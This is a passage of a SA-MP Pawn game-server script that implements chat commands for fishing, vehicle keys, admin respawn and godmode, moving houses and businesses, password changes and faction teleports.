	if(IsAtFishPlace(playerid) || IsABoat(GetPlayerVehicleID(playerid)) || IsABoat(GetPlayerSurfingVehicleID(playerid)))
	{
		if(PlayerInfo[playerid][pFishLic] == 0) return SCM(playerid,COLOR_ROUZ,"You haven't a Fish license.");
		if(PlayerFish[playerid] >= 1) return SCM(playerid,COLOR_LIGHTRED,"Wait to see a fish.");
		if(PlayerInfo[playerid][pFishes] >= 51) return SCM(playerid,COLOR_ROUZ,"Your fishes are full, sellthem first(/sellfishes)");
		new rand = RandomShomare(1,8);
		if(rand == 1)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Shark{FFFFFF}(5 kg)");
		PlayerInfo[playerid][pFishes] += 5;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 2)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Dolphin{FFFFFF}(3 kg)");
		PlayerInfo[playerid][pFishes] +=3;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 3)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Bandfish{FFFFFF}(1 kg)");
		PlayerInfo[playerid][pFishes] += 1;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 4)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Milkfish{FFFFFF}(1 kg)");
		PlayerInfo[playerid][pFishes] += 1;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 5)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Candiru{FFFFFF}(2 kg)");
		PlayerInfo[playerid][pFishes] += 2;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 6)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Mora{FFFFFF}(1 kg)");
		PlayerInfo[playerid][pFishes] += 1;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 7)
		{
		SCM(playerid,COLOR_YELLOW,"{19AF23}You caugh a Catfish{FFFFFF}(1 kg)");
		PlayerInfo[playerid][pFishes] += 1;
		SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
		PlayerFish[playerid] = 10;
		return 1;
		}
		if(rand == 8)
		{
			SCM(playerid,COLOR_YELLOW,"{19AF23}To Yek Kif Pool Gomshode Peida Kardi {FFFFFF}(+500$)");
			PlayerInfo[playerid][pFishes] += 1;
			SaveKonVal(playerid, "pFishes", PINFO[playerid][pFishes]);
			PlayerFish[playerid] = 10;
			GivePlayerPool(playerid,500);
			return 1;
		}
	}
	else return SCM(playerid,COLOR_Good,"You are not in a Boat or fish place.");
	return 1;
}
if(strcmp(cmd,"/sellfishes",true)==0)
{
	if(!IsPlayerInRangeOfPoint(playerid,5.0,2801.055175,-2356.169677,13.630423))
	{
		SCM(playerid,COLOR_ALI,"Shoma Dar Mahale Foroosh Mahi Nistid. Be Noghte Ghermez Beravid.");
		if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"Shoma Checkpoint Darid.");
		OnCheckpoint[playerid] = 1;
		SetPlayerCheckpoint(playerid,2801.055175,-2356.169677,13.630423,5);
		CP[playerid] = 42369423;
		return 1;
	}
	if(PlayerInfo[playerid][pFishLic] == 0) return SCM(playerid,COLOR_ROUZ,"You haven't a fish license.");
	if(PlayerInfo[playerid][pFishes] == 0) return SCM(playerid,COLOR_ROUZ,"You haven't any fish to sell it.");
	new cash = PlayerInfo[playerid][pFishes]*10;
	new strx[256];
	format(strx,256,"You sell your %d kgs fish for $%s.",PlayerInfo[playerid][pFishes],FormatNumber(cash));
	GivePlayerPool(playerid,cash);
	SCM(playerid,COLOR_ROUZ,strx);
	format(strx,256,"~g~%s",FormatNumber(cash));
	GameTextForPlayer(playerid,strx,5000,5);
	PlayerInfo[playerid][pFishes] = 0;
	SaveKonVal(playerid, "pFishes", 0);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	return 1;
}
if(strcmp(cmd,"/fishes",true)==0)
{
new strz[256];
if(PlayerInfo[playerid][pFishes] == 0) return SCM(playerid,COLOR_YELLOW,"You haven't any fish with you.");
format(strz,256,"You have %d kg fishes.",PlayerInfo[playerid][pFishes]);
SCM(playerid,COLOR_YELLOW,strz);
return 1;
}
if(strcmp(cmd,"/fishhelp",true)==0)
{
SCM(playerid,CRISTIAN,"|_________________** FISH HELP **___________________|");
SCM(playerid,COL_SYN,"** FISHING *** /fish /sellfishes /fishes");
SCM(playerid,CRISTIAN,"______________________________________________________");
return 1;
}
    if(strcmp(cmd, "/respawnthiscar", true) == 0 || strcmp(cmd, "/rtc", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 2 )
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
                return 1;
            }
            if(IsPlayerInAnyVehicle(playerid))
            {
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, 256, "[Admin-Warn]: admin {FFFFFF}%s has just respawned vehicle id {FFFFFF}%d.",sendername,GetPlayerVehicleID(playerid));
                ABroadCast(COLOR_Good,string,1);
                SetVehicleToRespawn(GetPlayerVehicleID(playerid));
                RemovePlayerFromVehicle(playerid);
                SendClientMessage(playerid, COLOR_GREY, "Vehicle Respawned.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/respawncar", true) == 0)
    {
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "USAGE: /respawncar <VehicleID>");
                return 1;
            }
            new testcar = strval(tmp);
                SetVehicleToRespawn(testcar);
                format(string, sizeof(string), "Car ID %d has been respawned .", testcar);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                if(PlayerInfo[playerid][pAdmin] >= 3)
                {
                    format(string, sizeof(string), "[Admin-Warn]: admin {FFFFFF}%s has respawned Car ID {FFFFFF}%d !", sendername, testcar);
                    ABroadCast(COLOR_Good,string,1);
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        return 1;
    }
    if(strcmp(cmd, "/givekey", true) == 0)
    {
        if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] != 0)
        {

            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /givekey <PlayerID/PartOfName> <CarID(1 or 2)>");
            new taraf = ReturnUser(tmp);
            if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_ALI,"That player is offline.");
            if(!ProxDetectorS(6,playerid,taraf)) return SCM(playerid,COLOR_ALI,"That player isn't near you.");
            if(taraf == playerid) return SCM(playerid,COLOR_ALI,"You can't give key of your vehicle to yourself.");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /givekey <PlayerID/PartOfName> <CarID(1 or 2)>");
            new carid = strval(tmp);
            if(carid != 1 && carid != 2) return SCM(playerid,COLOR_ALI,"Invalid CarID.");
            if(carid == 1)
            {
                IHaveKey[taraf] = PINFO[playerid][pCar];
                KeyDade[playerid] = taraf;
                format(string,sizeof string,"%s Gives key of The his/her vehicle to you, you can now unlock/lock his/her vehicle.",PINFO[playerid][pName]);
                SCM(taraf,COLOR_Good,string);
                format(string,sizeof string,"You give key of your vehicle to %s, he can now unlocks/locks your vehicle.",PINFO[taraf][pName]);
                SCM(playerid,COLOR_Good,string);
                return 1;
            }
            if(carid == 2)
            {
                IHaveKey_2[taraf] = PINFO[playerid][pCar_2];
                KeyDade_2[playerid] = taraf;
                format(string,sizeof string,"%s Gives key of The his/her vehicle to you, you can now unlock/lock his/her vehicle.",PINFO[playerid][pName]);
                SCM(taraf,COLOR_Good,string);
                format(string,sizeof string,"You give key of your vehicle to %s, he can now unlocks/locks your vehicle.",PINFO[taraf][pName]);
                SCM(playerid,COLOR_Good,string);
            }
            return 1;
        }
        else if(PINFO[playerid][pCar] != 0)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp))
            {
                SCM(playerid,COL_SYN,"Syntax: /givekey <PlayerID/PartOfName>");
                return 1;
            }
            new playidd = ReturnUser(tmp);
            if(IsPlayerConnected(playidd))
            {
                if(!ProxDetectorS(6, playidd, playerid))
                {
                    SCM(playerid,COLOR_ALI,"That player not near you.");
                    return 1;
                }
                if(playidd == playerid)
                {
                    SCM(playerid,COLOR_ALI,"You can not givekey yourself.");
                    return 1;
                }
                new alistr[256];
                IHaveKey[playidd] = PINFO[playerid][pCar];
                KeyDade[playerid] = playidd;
                new sname[MAX_PLAYER_NAME];
                GetPlayerName(playerid, sname,sizeof sname);
                format(alistr, 256, "%s Give his/her vehicle key to you, you can now unlock/lock his/her vehicle.",sname);
                SCM(playidd,COLOR_Good,alistr);
                new plyname[MAX_PLAYER_NAME];
                GetPlayerName(playidd,plyname,MAX_PLAYER_NAME);
                format(alistr, 256, "You give your vehicle key to %s, he can now unlock/lock your vehicle.",plyname);
                SCM(playerid,COLOR_Good,alistr);
                return 1;
            }
            else
            {
                SCM(playerid,COLOR_Good,"That player is offline.");
                return 1;
            }
        }
        else if(PINFO[playerid][pCar_2] != 0)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /givekey <PlayerID/PartOfName>");
            new taraf = ReturnUser(tmp);
            if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_ALI,"That player is offline.");
            if(!ProxDetectorS(6,taraf,playerid)) return SCM(playerid,COLOR_ALI,"That player isn't near you.");
            if(taraf == playerid) return SCM(playerid,COL_SYN,"You can't givekey yourself.");
            IHaveKey_2[taraf] = PINFO[playerid][pCar_2];
            KeyDade_2[playerid] = taraf;
            format(string,sizeof string,"%s Gives key of his/her vehicle to you, you can now unlock/lock his/her vehicle.",PINFO[playerid][pName]);
            SCM(taraf,COLOR_Good,string);
            format(string,sizeof string,"You give key of your vehicle to %s, he can now unlocks/locks your vehicle.",PINFO[taraf][pName]);
            SCM(playerid,COLOR_Good,string);
            return 1;
        }
        else
        {
            SCM(playerid,COLOR_ALI,"You haven't a Personal car");
            return 1;
        }
    }
    if(strcmp(cmd, "/respawnallcars", true) == 0 || strcmp(cmd, "/rac", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 5)
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: You are not authorized to use this command.");
                return 1;
            }
            for(new i;i<MAX_VEHICLES;i++)
            {
            if(IsUnusedVehicle(i) && IsVehicleConnected(i) && OwnedMashin[i] == 0 && OwnedMashin_2[i] == 0) SetVehicleToRespawn(i);
            }
            format(string,256,"All Vehicles Respawned By Owner %s",PINFO[playerid][pName]);
            AdminWarn(string);
        }
        return 1;
    }
		if(!strcmp(cmd, "/gm", true))
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerInfo[playerid][pAdmin] <= 5) return SCM(playerid, COLOR_YELLOW2, "Error: Unknown command.");
				if(GodmodeFeature[playerid] == false)
				{
					GodmodeFeature[playerid] = true;
					SCM(playerid, COLOR_ALI, "Godmode: {00FF00}Enabled.");
					new sttrr[118];
					format(sttrr,256,"{FFFFFF}Admin %s {00FF00}enabled {FFFFFF}the godmode feature for himself.", PINFO[playerid][pName]);
					AdminWarn(sttrr);
					PlayerPlaySound(playerid, 1149, 0.0, 0.0, 0.0);
					SetPlayerKhoon(true, playerid, 100000);
				}
				else if(GodmodeFeature[playerid] == true)
				{
					GodmodeFeature[playerid] = false;
					SCM(playerid,COLOR_ROUZ,"Godmode: {57e547}Disabled.");
					PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
					new sttrr[118];
					format(sttrr,256,"{FFFFFF}Admin %s {57e547}disabled {FFFFFF}the godmode feature for himself.", PINFO[playerid][pName]);
					AdminWarn(sttrr);
					SetPlayerKhoon(true, playerid, 100);
				}
			}
			return 1;

			}

		if(!strcmp(cmd, "/Vgodmod", true))
		{
			if(IsPlayerConnected(playerid))
			{
        if(PlayerInfo[playerid][pPremiumAccount] < 101) return SCM(playerid, COLOR_GREEN, "Vip level 2 nistid.");
				if(GodmodeFeature[playerid] == false)
				{
					GodmodeFeature[playerid] = true;
					SCM(playerid, COLOR_ALI, "Godmode: {00FF00}Enabled.");
					new sttrr[118];
					format(sttrr,256,"{FFFFFF}Vip %s {00FF00}enabled {FFFFFF}the godmode feature for himself.", PINFO[playerid][pName]);
					AdminWarn(sttrr);
					PlayerPlaySound(playerid, 1149, 0.0, 0.0, 0.0);
					SetPlayerKhoon(true, playerid, 100000);
				}
				else if(GodmodeFeature[playerid] == true)
				{
					GodmodeFeature[playerid] = false;
					SCM(playerid,COLOR_ROUZ,"Godmode: {57e547}Disabled.");
					PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
					new sttrr[118];
					format(sttrr,256,"{FFFFFF}Vip %s {57e547}disabled {FFFFFF}the godmode feature for himself.", PINFO[playerid][pName]);
					AdminWarn(sttrr);
					SetPlayerKhoon(true, playerid, 100);
				}
			}
			return 1;

			}


	    if(!strcmp(cmd, "/gmt", true))
    {
	       tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /godmodeto <PlayerID/PartOfName>");
                return 1;
            }
		new playa;
        playa = ReturnUser(tmp);
        if(IsPlayerConnected(playa))
        {
            if(PlayerInfo[playerid][pAdmin] <= 5) return SCM(playerid, COLOR_GREEN, "Error: You are not authorized to use this command.");
            if(GodmodeFeature[playa] == false)
            {
                GodmodeFeature[playa] = true;
                SCM(playa, COLOR_ALI, "Godmode: {00FF00}Enabled.");
                new sttrr[118];
                format(sttrr,256,"Admin %s enabled the godmode feature for %s.", PINFO[playerid][pName], PINFO[playa][pName]);
                AdminWarn(sttrr);
                PlayerPlaySound(playa, 1149, 0.0, 0.0, 0.0);
                SetPlayerKhoon(true, playa, 100000.0);
            }
            else if(GodmodeFeature[playa] == true)
            {
                GodmodeFeature[playa] = false;
                SCM(playerid,COLOR_ROUZ,"Godmode: {57e547}Disabled.");
                PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
                new sttrr[118];
                format(sttrr,256,"Admin %s disabled the godmode feature for %s.", PINFO[playerid][pName], PINFO[playa][pName]);
                AdminWarn(sttrr);
                SetPlayerKhoon(true, playa, 100.0);
            }
        }
        return 1;
    }
    if(!strcmp(cmd, "/dr", true))
		{
		ShowPlayerDialog(playerid,32700,DIALOG_STYLE_LIST,"Driving System","On/Off Speed Booster \nOn/Off Brake Booster","Select","Cancel");
		return 1;
		}
    if(strcmp(cmd, "/drag", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(PINFO[playerid][pAdmin] <= 0)
        {
        SCM(playerid,COLOR_YELLOW2,"Error: Error: Your admin level isn't high enough to use this command");
        return 1;
        }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /drag <PlayerID/PartOfName>");
                return 1;
            }
            new newcar = GetPlayerVehicleID(playerid);
            new playa;
            playa = ReturnUser(tmp);
            if(!newcar) { SCM(playerid,COLOR_ALI,"You are not in a vehicle."); return 1; }
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        new Float:x, Float:y, Float:z;
                        GetPlayerPos(playa,x,y,z);
                        if(PlayerToPoint(5, playerid, x, y, z))
                        {
                            PutPlayerInVehicle(playa,newcar,1);
                            GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            new sttr[256];
                            format(sttr,256,"Admin %s drags you to his/her vehicle.",sendername);
                            SCM(playa,COLOR_Good,sttr);
                            SCM(playerid,COLOR_ALI,"Dragged.");
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_LIGHTRED, "Player is not near you.");
                        }
                    }
                }
        }
        return 1;
    }
    //------------------------------[Vehicle Slap]---------------------------------------------------
    if(strcmp(cmd, "/vehslap", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] >= 4)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /vehslap <PlayerID/PartOfName>");
                return 1;
            }
            new playa;
            giveplayerid = ReturnUser(tmp);
            new Float:slx, Float:sly, Float:slz;
            playa = ReturnUser(tmp);
                if(IsPlayerConnected(playa))
                {
                if(!IsPlayerInAnyVehicle(playa)) return SCM(playerid,COLOR_LIGHTRED,"that Player Is not in any vehicle.");
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, playername, sizeof(playername));
                        GetVehiclePos(GetPlayerVehicleID(giveplayerid), slx, sly, slz);
                        SetVehiclePos(GetPlayerVehicleID(giveplayerid), slx, sly, slz+550);
                        PlayerPlaySound(playa, 1130, slx, sly, slz+5);
                        format(string, sizeof(string), "[Admin-Warn]: admin {FFFFFF}%s using the vehslap for player: {FFFFFF}%s.", playername, giveplayer);
                        ABroadCast(COLOR_Good,string, 1);
                        format(string, sizeof(string), "You have been vehicleslapped by Admin %s", playername);
                        SCM(playa, COLOR_LIGHTRED, string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        return 1;
    }
//------------------------------[super vehslap]--------------------------------------------------
    if(strcmp(cmd, "/supervehslap", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] >= 4)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /supervehslap <PlayerID/PartOfName>");
                return 1;
            }
            new playa;
            giveplayerid = ReturnUser(tmp);
            new Float:slx, Float:sly, Float:slz;
            playa = ReturnUser(tmp);
                if(IsPlayerConnected(playa))
                {
                if(!IsPlayerInAnyVehicle(playa)) return SCM(playerid,COLOR_LIGHTRED,"that Player Is not in any vehicle.");
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, playername, sizeof(playername));
                        GetVehiclePos(GetPlayerVehicleID(giveplayerid), slx, sly, slz);
                        SetVehiclePos(GetPlayerVehicleID(giveplayerid), slx, sly, slz+1000);
                        PlayerPlaySound(playa, 1130, slx, sly, slz+5);
                        format(string, sizeof(string), "[Admin-Warn]: admin {FFFFFF}%s using the supervehslap for player: {FFFFFF}%s.", playername,giveplayer);
                        ABroadCast(COLOR_Good,string, 5);
                        format(string, sizeof(string), "You have been supervehicleslapped by Admin %s", playername);
                        SCM(playa, COLOR_LIGHTRED, string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        return 1;
    }
    if(!strcmp(cmd, "/speaker", true))
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pPnumber] == 0)
            {
                SendClientMessage(playerid, COLOR_PURPLE, "You do not have a phone.");
                return 1;
            }
            if(Mobile[playerid] == 9999)
            {
                SendClientMessage(playerid, COLOR_PURPLE, "You are not in a phone call.");
                return 1;
            }
            if(PlayerInfo[playerid][pSpeaker] == 0)
            {
                SendClientMessage(playerid, COLOR_YELLOW2, "Beep Speaker is on.");
                PlayerInfo[playerid][pSpeaker] = 1;//NEmikhad save she
                return 1;
            }
            if(PlayerInfo[playerid][pSpeaker] == 1)
            {
                SendClientMessage(playerid, COLOR_YELLOW2, "Beep Speaker is off.");
                PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad save she
                return 1;
            }
        }
        return 1;
    }
//-----------------------------------------------------------------------------------------
    if(strcmp(cmd, "/movehouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 7)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /movehouse <HouseID>");
                    return 1;
                }
                new proplev = strval(tmp);
                if(proplev > sizeof(HouseInfo) || proplev < 0)
                {
                    return 1;
                }
                else
                {
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(playerid,X,Y,Z);
                    format(string,sizeof(string),"Moved House %d in the position %f,%f,%f",proplev,X,Y,Z);
                    ABroadCast(COLOR_LIGHTRED,string,5);
                    HouseInfo[proplev][hExitx] = X;
                    SaveKonFloatH(proplev, "hExitx", X);
                    HouseInfo[proplev][hExity] = Y;
                    SaveKonFloatH(proplev, "hExity", Y);
                    HouseInfo[proplev][hExitz] = Z;
                    SaveKonFloatH(proplev, "hExitz", Z);
                    DestroyDynamic3DTextLabel(houser[proplev]);
                    houser[proplev] = CreateDynamic3DTextLabel("Loading Info ...",COLOR_LIGHTGREENN,HouseInfo[proplev][hExitx],HouseInfo[proplev][hExity],HouseInfo[proplev][hExitz],10.0);
                    return 1;
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
            return 1;
            }
        }
        return 1;
    }//hExitx
    if(strcmp(cmd, "/exph", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 7)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /exph <HouseID>");
                    return 1;
                }
                new proplev = strval(tmp);
                if(proplev > sizeof(HouseInfo) || proplev < 0)
                {
                    return 1;
                }
                else
                {
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(playerid,X,Y,Z);
                    format(string,sizeof(string),"Moved House %d in the position %f - %f - %f",proplev,X,Y,Z);
                    ABroadCast(COLOR_LIGHTRED,string,5);
                    HouseInfo[proplev][hEntrancex] = X;
                    SaveKonFloatH(proplev, "hEntrancex", X);
                    HouseInfo[proplev][hEntrancey] = Y;
                    SaveKonFloatH(proplev, "hEntrancey", Y);
                    HouseInfo[proplev][hEntrancez] = Z;
                    SaveKonFloatH(proplev, "hEntrancez", Z);
                    HouseInfo[proplev][hInt] = GetPlayerInterior(playerid);
                    SaveKonValH(proplev, "hInt", GetPlayerInterior(playerid));
                    //SaveAccount(playerid);
                    return 1;
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
            return 1;
            }
        }
    }
   if(strcmp(cmd, "/ebiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 7)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /exph <BizID>");
                    return 1;
                }
                new proplev = strval(tmp);
                if(proplev > sizeof(HouseInfo) || proplev < 0)
                {
                    return 1;
                }
                else
                {
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(playerid,X,Y,Z);
                    format(string,sizeof(string),"Moved Biz Ex %d in the position %f - %f - %f",proplev,X,Y,Z);
                    ABroadCast(COLOR_LIGHTRED,string,5);
                    BizzInfo[proplev][bExitX] = X;
                    SaveKonFloatH(proplev, "bExitX", X);
                    BizzInfo[proplev][bExitY] = Y;
                    SaveKonFloatH(proplev, "bExitY", Y);
                    BizzInfo[proplev][bExitZ] = Z;
                    SaveKonFloatH(proplev, "bExitZ", Z);
                    //SaveAccount(playerid);
                    return 1;
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
            return 1;
            }
        }
    }
    if(strcmp(cmd, "/movebiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 7)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /movebiz <BizID>");
                    return 1;
                }
                new proplev = strval(tmp);
                if(proplev > sizeof(BizzInfo) || proplev < 0)
                {
                    return 1;
                }
                else
                {
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(playerid,X,Y,Z);
                    format(string,sizeof(string),"Moved Bis %d in the position %f - %f - %f",proplev,X,Y,Z);
                    ABroadCast(COLOR_LIGHTRED,string,1);
                    BizzInfo[proplev][bEntranceX] = X;
                    BizzInfo[proplev][bEntranceY] = Y;
                    BizzInfo[proplev][bEntranceZ] = Z;
					DestroyDynamic3DTextLabel(bizer[proplev]);
                    bizer[proplev] = CreateDynamic3DTextLabel("Loading Bizes ...",COLOR_BIZ,BizzInfo[proplev][bEntranceX], BizzInfo[proplev][bEntranceY], BizzInfo[proplev][bEntranceZ],10.0);
                    //SaveAccount(playerid);
                    return 1;
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
            return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/movesbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 7)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /movesbiz <SbizID>");
                    return 1;
                }
                new proplev = strval(tmp);
                if(proplev > sizeof(SBizzInfo) || proplev < 0)
                {
                    return 1;
                }
                else
                {
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(playerid,X,Y,Z);
                    format(string,sizeof(string),"Moved sBis %d in the position %f - %f - %f",proplev,X,Y,Z);
                    ABroadCast(CRISTIAN,string,1);
                    SBizzInfo[proplev][sbEntranceX] = X;
                    SBizzInfo[proplev][sbEntranceY] = Y;
                    SBizzInfo[proplev][sbEntranceZ] = Z;
					DestroyDynamic3DTextLabel(sbizer[proplev]);
					sbizer[proplev] = CreateDynamic3DTextLabel("Loading Sbizzes ...",COLOR_BIZ,SBizzInfo[proplev][sbEntranceX], SBizzInfo[proplev][sbEntranceY], SBizzInfo[proplev][sbEntranceZ],10.0);
                    //SaveAccount(playerid);
                    return 1;
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
            return 1;
            }
        }
        return 1;
    }


    if(strcmp(cmd, "/changepassword", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "You need to login first.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /changepassword <NewPassword>");
                return 1;
            }
            if(FindBadSign(tmp))
            {
                SendClientMessage(playerid, COLOR_RED,"only [a-z] [A-Z] [0-9] [] _ () allowed for password");
                return 1;
            }
                if(strlen(tmp) >= 128)
                {
                SCM(playerid,COLOR_ALI,"Invalid Password Type a password with -128 length");
                return 1;
               }
            strmid(PlayerInfo[playerid][pKey], tmp, 0, strlen(tmp), 128);
            SaveKonStr(playerid, "pKey", tmp);
            //SaveAccount(playerid);
            SendClientMessage(playerid, COLOR_Good, "Password has been changed successfuly.");
            SendClientMessage(playerid, COLOR_Good, "This feature is comming up on next release");
        }
        return 1;
    }

    if(!strcmp(cmd, "/pdup", true))
    {
        if(IsPlayerConnected(playerid))
        {
            if(GetPlayerState(playerid) == 1)
            {
                if(IsACop(playerid))
                {
                    if(PlayerToPoint(3.0,playerid,1524.7275,-1677.5446,5.8906))
                    {
                        SetPlayerPosEx(playerid, 1564.8011,-1666.5461,28.3956);
                        GameTextForPlayer(playerid, "~w~Police Departemnt Roof",5000,1);
                        SetPlayerInterior(playerid,0);
                        Mahal[playerid] = 9999;
                        TooHouse[playerid] = 9999;
                        TooBiz[playerid] = 9999;
                    }
                }
                else
                {
                SCM(playerid,COLOR_BLUE,"You are not a Cop.");
                return 1;
                }
            }
        }
        return 1;
    }
    if(!strcmp(cmd, "/pddown", true))
    {
        if(IsPlayerConnected(playerid))
        {
            if(GetPlayerState(playerid) == 1)
            {
                if(IsACop(playerid))
                {
                    if(PlayerToPoint(1.0,playerid,242.3151,66.3457,1003.6406))
                    {
                        SetPlayerPosEx(playerid, 1524.7275,-1677.5446,5.8906);
                        GameTextForPlayer(playerid, "~w~Police Departemnt Garage",5000,1);
                        SetPlayerInterior(playerid,0);
                        Mahal[playerid] = 9999;
                        TooHouse[playerid] = 9999;
                        TooBiz[playerid] = 9999;
                    }
                }
                else
                {
                SCM(playerid,COLOR_BLUE,"You are not a Cop.");
                return 1;
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/up", true) == 0)
    {
        if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)//Medic heli up
        {
            if (PlayerToPoint(5, playerid, 1615.0603,1815.7771,10.8203))
            {
                SetPlayerPosEx(playerid, 1607.4210,1787.6932,30.4688);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
        if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)//SFPD heli up
        {
            if (PlayerToPoint(5, playerid, -1606.268066,672.061706,-4.906250))
            {
                SetPlayerPosEx(playerid, -1639.474853,716.886535,48.937500);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
